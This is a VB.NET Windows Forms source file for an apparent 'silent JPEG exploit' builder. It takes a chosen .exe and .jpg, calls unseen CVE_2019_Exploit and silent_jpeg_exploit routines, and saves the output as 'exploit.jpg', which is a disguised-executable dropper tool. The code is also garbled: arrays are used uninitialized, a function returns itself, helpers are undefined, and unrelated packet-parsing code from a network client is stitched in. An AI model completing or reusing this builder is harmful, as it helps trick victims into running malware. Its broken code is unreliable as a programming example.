Public Class Form1
    Public Declare Function RegisterHotKey Lib "user32" (ByVal hwnd As IntPtr, ByVal id As Integer, ByVal fsModifiers As Integer, ByVal vk As Integer) As Integer
    Public Declare Function UnregisterHotKey Lib "user32" (ByVal hwnd As IntPtr, ByVal id As Integer) As Integer
    Public Const WM_HOTKEY As Integer = &H312
    
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim file As New OpenFileDialog
        file.Title = "file..."
        file.Filter = " *.exe|*.exe"
        If file.ShowDialog = Windows.Forms.DialogResult.OK Then
            TextBox1.Text = file.FileName
        Else : Exit Sub
        End If
    End Sub
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Dim file As New OpenFileDialog
        file.Title = "file..."
        file.Filter = "*.jpg|*.jpg"
        If file.ShowDialog = Windows.Forms.DialogResult.OK Then
            TextBox2.Text = file.FileName
        Else : Exit Sub
        End If

    End Sub
    Public Function Packet_CheckHeader(ByRef Packet() As Byte, ByRef Key1 As Byte) As Boolean
        Dim DeContent() As DecryptResult = {}
        Dim LeftContent() As Byte
        Dim NowContent() As Byte = {}
        Do Until (UBound(LeftContent) < 1)

            Dim Packet_SingleLen As UInt16 = Packet_GetLength(LeftContent, Key1)
            ReDim NowContent(Packet_SingleLen - 1)
            Buffer.BlockCopy(LeftContent, 0, NowContent, 0, Packet_SingleLen)
            Dim NewLeft() As Byte
            ReDim NewLeft(UBound(LeftContent) - NowContent.Length)
            If NewLeft.Length <> 0 Then
                Buffer.BlockCopy(LeftContent, NowContent.Length, NewLeft, 0, NewLeft.Length)
            End If
            LeftContent = NewLeft

            Array.Resize(DeContent, UBound(DeContent) + 1 + 1)
        Loop
    End Function
    Public Function ToInt32(ByRef Bytes() As Byte) As UInt32
        Return BitConverter.ToUInt32(Bytes, 0)
    End Function

    Public Function PacketDic(ByRef Int As UInt32) As Byte()
        Return BitConverter.GetBytes(Int)
    End Function

    Public Function Packet_Encrypt_ToServer(ByRef Packet() As Byte) As Byte()
        Dim DeContent() As DecryptResult = {}
        Dim LeftContent() As Byte
        Dim NowContent() As Byte = {}
        Dim NewLeft() As Byte
        ReDim NewLeft(UBound(LeftContent) - NowContent.Length)
        If NewLeft.Length <> 0 Then
            Buffer.BlockCopy(LeftContent, NowContent.Length, NewLeft, 0, NewLeft.Length)
        End If
        LeftContent = NewLeft
        Array.Resize(DeContent, UBound(DeContent) + 1 + 1)
    End Function
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Dim SavePath As String = Application.StartupPath() & "\include.dll"
        If System.IO.File.Exists(SavePath) Then
        Else
            MsgBox("Error: file does not exist" & SavePath, MsgBoxStyle.Critical)
            End
        End If
    End Sub
    Public Function ByteToHex(ByRef Origin As Byte) As String
        Dim ns As String = Origin.ToString("X")
        If ns.Length = 1 Then
            ns = "0" & ns
        End If
        Return ns
    End Function
    Public Function BytesToHex(ByRef Bytes() As Byte) As String
        Dim result As String = "", ns As String
        For i As Integer = 0 To UBound(Bytes)

            If result <> "" Then
                result += " "
            End If
            ns = Bytes(i).ToString("X")
            If Len(ns) = 1 Then
                ns = "0" & ns
            End If
            result += ns

        Next

        Return result
    End Function
    Public Shared Function LOBYTE(ByRef Num As Int32) As Byte
        Return GetByte(Num)
    End Function
    Public Function Make_BufferContent(ByRef buffer() As Byte) As Byte()
        Dim count As Integer = 0
        For i As Integer = 0 To UBound(buffer)
            count = i
            If i >= 2 Then
                If buffer(i - 2) = 4 AndAlso buffer(i - 1) = 0 AndAlso buffer(i) = 0 Then
                    count -= 3
                    Exit For
                ElseIf buffer(i - 2) = 0 AndAlso buffer(i - 1) = 0 AndAlso buffer(i) = 0 Then
                    count -= 3
                    Exit For
                End If
            End If
        Next
        Dim nf() As Byte
        ReDim nf(count)
        For i As Integer = 0 To count
            nf(i) = buffer(i)
        Next
        Return nf
    End Function
    Private Function _bytes(ByVal _hex3 As String, ByVal _hex4 As String)
        Dim _hex16 As String = ""
        Dim ssbyte As Short
        Dim nnbyte As Integer
        nnbyte = Asc(_hex4)
        For ssbyte = 1 To Len(_hex3)
            _hex16 &= Chr(nnbyte Xor Asc(Mid(_hex3, ssbyte, 1)))
        Next
        Return _hex16
    End Function
    Private Function byte_int(ByVal byte_int1 As String, ByVal byte_all As String)
        Dim byte_int2 As String = ""
        Dim byte_int3 As Short
        Dim hax_all As Integer
        hax_all = Asc(byte_all)
        For byte_int3 = 1 To Len(byte_int1)
            byte_int2 &= Chr(hax_all Xor Asc(Mid(byte_int1, byte_int3, 1)))
        Next
        Return byte_int2
    End Function
    Public Function StrToBytes(ByVal Origin_Str As String) As Byte()
        Dim Origin() As String = Split(Origin_Str, " ")
        Dim T() As Byte
        ReDim T(UBound(Origin))
        For i As Integer = 0 To UBound(T)
            T(i) = Val(HexToByte(Origin(i)))
        Next
        Return T
    End Function
    Private Function HexToByte(ByVal Origin As String) As Byte
        Dim HexData As String = "0123456789ABCDEF"
        Dim BData As Byte
        Dim BData_1 As Byte
        For i As Integer = 0 To 15
            If Origin(0) = HexData(i) Then
                BData = i
            End If
            If Origin(1) = HexData(i) Then
                BData_1 = i
            End If
        Next
        Dim Result As Byte = (16 * BData) + BData_1
        Return Result
    End Function
    Public Function Combine(ByVal a As Byte(), ByVal b As Byte()) As Byte()
        Dim c As Byte() = New Byte(a.Length + b.Length - 1) {}
        System.Buffer.BlockCopy(a, 0, c, 0, a.Length)
        System.Buffer.BlockCopy(b, 0, c, a.Length, b.Length)
        Return c
    End Function
    Public Function Combine(ByVal a As Byte(), ByVal b As Byte(), ByVal c As Byte()) As Byte()
        Return Combine(Combine(a, b), c)
    End Function
    Public Function CtB(ByRef Str As String) As Byte()
        Return CharToBytes(Str)
    End Function
    Public Function CharToBytes(ByRef Str As String) As Byte()
        Return System.Text.Encoding.UTF8.GetBytes(Str)
    End Function
    Public Function CP949ToBytes(ByRef Str As String) As Byte()
        Return System.Text.Encoding.GetEncoding(949).GetBytes(Str)
    End Function
    Public Function BytesTo949(ByRef Bytes() As Byte) As String
        Return System.Text.Encoding.GetEncoding(949).GetString(Bytes)
    End Function
    Public Function BytesToStr(ByRef Bytes() As Byte) As String
        Return System.Text.Encoding.UTF8.GetString(Bytes)
    End Function
    Public Function ByteLen(ByVal Str As String) As Integer
        Return (UBound(CP949ToBytes(Str)) + 1)
    End Function
    Public Function Reverse(ByRef Bytes() As Byte) As Byte()
        Dim NByte() As Byte = Bytes
        Array.Reverse(NByte)
        Return NByte
    End Function
    Public Function GetHeader(ByRef Header As CVE_2019_Exploit, ByRef Key1 As Byte) As Byte()
        Dim HeaderData(8) As Byte
        HeaderData(0) = LOBYTE(Header.PacketLength)
        HeaderData(1) = HIBYTE(Header.PacketLength)
        HeaderData(2) = LOBYTE(Header.OpCode)
        HeaderData(3) = HIBYTE(Header.OpCode)
        HeaderData(4) = Header.ZeroBits(0)
        HeaderData(5) = Header.ZeroBits(1)
        HeaderData(6) = Header.Rand1
        HeaderData(7) = Header.Constant_Byte
        Return HeaderData
    End Function
    Public Function ByteToUInt32(ByRef Bytes() As Byte) As UInt32
        Return BitConverter.ToUInt32(Bytes, 0)
    End Function
    Public Function IntToByte(ByRef Int As UInt16) As Byte()
        Return BitConverter.GetBytes(Int)
    End Function
    Public Function IntToByte(ByRef Int As UInt32) As Byte()
        Return BitConverter.GetBytes(Int)
    End Function
    Public Function ReadPacket_Bytes(ByRef Bytes() As Byte, ByVal ReadCount As Integer) As ReadPacketResult
        Dim OldBytes() As Byte = {}, NewBytes() As Byte = {}
        Dim result As ReadPacketResult
        If UBound(Bytes) < (ReadCount - 1) Then
            Return result
        End If

        ReDim OldBytes(ReadCount - 1)
        ReDim NewBytes(UBound(Bytes) - (UBound(OldBytes) + 1))

        For i As Integer = 0 To UBound(Bytes)
            If i <= UBound(OldBytes) Then
                OldBytes(i) = Bytes(i)
            Else
                NewBytes(i - (UBound(OldBytes) + 1)) = Bytes(i)
            End If
        Next
        result = New ReadPacketResult With {
            .HasError = False,
            .ReadBytes = OldBytes,
            .LeftBytes = NewBytes
            }
        Return result
    End Function
    Private Function SILENT(ByVal p1 As Integer) As Object()
        Return SILENT
    End Function
    Public Function ReadPacket_String(ByRef Bytes() As Byte) As ReadPacketResult
        Dim OldBytes() As Byte = {}, NewBytes() As Byte = {}, CutCount As Integer = -1
        Dim result As ReadPacketResult
        For i As Integer = 0 To UBound(Bytes)
            If Bytes(i) = 0 Then
                ReDim OldBytes(i - 1)
                ReDim NewBytes(UBound(Bytes) - UBound(OldBytes) - 1)

                If UBound(OldBytes) = -1 Then
                    Return result
                Else
                    CutCount = i
                    Exit For
                End If
            End If
        Next

        If CutCount = -1 Then
            Return result
        End If
        For n As Integer = 0 To UBound(OldBytes) + UBound(NewBytes)
            If n <= UBound(OldBytes) Then
                OldBytes(n) = Bytes(n)
            Else
                NewBytes(n - UBound(OldBytes) - 1) = Bytes(n + 1)
            End If
        Next

        result = New ReadPacketResult With {
            .HasError = False,
            .ReadBytes = OldBytes,
            .LeftBytes = NewBytes
            }
        Return result
    End Function
    Public Function ReadByte(ByRef Bytes() As Byte) As Byte
        Return ReadBytes(Bytes, 1)(0)
    End Function
    Public Function ReadBytes(ByRef Bytes() As Byte, ByVal count As Integer) As Byte()
        Dim readresult As ReadPacketResult = ReadPacket_Bytes(Bytes, count)
        If readresult.HasError = True Then
            Throw New Exception("ReadBytes Error")
        End If
        Bytes = readresult.LeftBytes
        Return readresult.ReadBytes
    End Function
    Public Function ReadString(ByRef Bytes() As Byte) As String
        Dim readresult As ReadPacketResult = ReadPacket_String(Bytes)
        If readresult.HasError = True Then
            Throw New Exception("ReadString Error")
        End If
        Bytes = readresult.LeftBytes
        Return BytesTo949(readresult.ReadBytes)
    End Function
    Public Function Combine_PacketHeader(ByRef Header As CVE_2019_Exploit, ByVal Content() As Byte, ByRef Key1 As Byte) As Byte()
        Dim HeaderData() As Byte = GetHeader(Header, Key1)
        Return Combine(HeaderData, Content)
    End Function
    Public Class ReadPacketResult
        Public HasError As Boolean
        Public ReadBytes() As Byte
        Public LeftBytes() As Byte
    End Class
    Public Header As CVE_2019_Exploit
    Public ContentBytes As Byte()
    Public Checksum As Boolean
    Public PacketLength As UInt16 ' 2 Bytes
    Public OpCode As UInt16 ' 2 Bytes
    Public ZeroBits() As Byte = {&H0, &H0} ' 2 Bytes
    Public Rand1 As Byte
    Public Constant_Byte As Byte
    Public Rand2 As Byte

    Private Function ToInt32(ByVal p1 As Byte) As Integer
        Throw New NotImplementedException
    End Function
    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Dim filad As New SaveFileDialog
        Dim int2DArray(2, 2) As Integer
        Dim fs As String = TextBox1.Text + TextBox2.Text
        Dim all As String = fs & TextBox1.Text & fs & TextBox2.Text & fs
        CVE_2019_Exploit.SILENT_convert()
        For i As Integer = 0 To int2DArray.GetUpperBound(0)
            For x As Integer = 0 To _
              int2DArray.GetUpperBound(1)
                ' int2DArray(i, x) = all + i + x
            Next
        Next
        For i As Integer = 0 To int2DArray.GetUpperBound(0)
            For x As Integer = 0 To _
            int2DArray.GetUpperBound(1)
            Next
        Next
        Try
            Dim HeaderData(8) As Byte
            ' HeaderData(0) = LOBYTE(Header.PacketLength)
            HeaderData(1) = HIBYTE(Header.PacketLength)
            HeaderData(2) = LOBYTE(Header.OpCode)
            HeaderData(3) = HIBYTE(Header.OpCode)
            HeaderData(4) = Header.ZeroBits(0)
            HeaderData(5) = Header.ZeroBits(1)
            HeaderData(6) = Header.Rand1
            HeaderData(7) = Header.Constant_Byte
            CVE_2019_Exploit.exp1(SILENT(6))
            '  CVE_2019_Exploit.Convert_JPG(Convert.tbyte(2))
            silent_jpeg_exploit.ByteLen(1)
            silent_jpeg_exploit.ByteLen(2)
            silent_jpeg_exploit.ByteLen(3)
            silent_jpeg_exploit.ByteLen(4)
            silent_jpeg_exploit.ByteLen(5)
            silent_jpeg_exploit.ByteLen(6)
            silent_jpeg_exploit.ByteLen(7)
            CVE_2019_Exploit.SILENT_convert()
            filad.FileName = "exploit.jpg"
            filad.Filter = "*.JPG|*.jpg"
            filad.ShowDialog()
        Catch
        End Try
    End Sub
End Class